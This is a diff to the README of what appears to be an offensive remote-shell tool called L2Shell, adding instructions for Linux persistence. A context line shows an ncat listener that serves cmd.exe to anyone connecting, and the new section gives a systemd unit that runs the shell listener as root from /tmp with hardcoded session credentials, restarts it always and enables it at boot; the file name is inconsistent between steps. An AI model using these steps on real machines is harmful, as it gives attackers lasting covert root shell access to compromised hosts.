@@ -81,3 +81,28 @@ ncat.exe -lvnp 2223 -u -e cmd.exe
 - scapy
 
 `note: commands and readme are temporary for the prototype`
+
+## Linux Persistence via Service
+```
+/etc/systemd/system
+sudo nano l2service.server
+```
+```
+[Unit]
+Description=L2Shell Listener Service
+After=network.target
+
+[Service]
+ExecStart=python3 /tmp/L2Shell-main/l2shell.py -l -a att123 -s sess123
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+```
+### Now enable the service
+```
+sudo systemctl daemon-reload
+sudo systemctl start l2service.service
+sudo systemctl enable l2service.service
+```
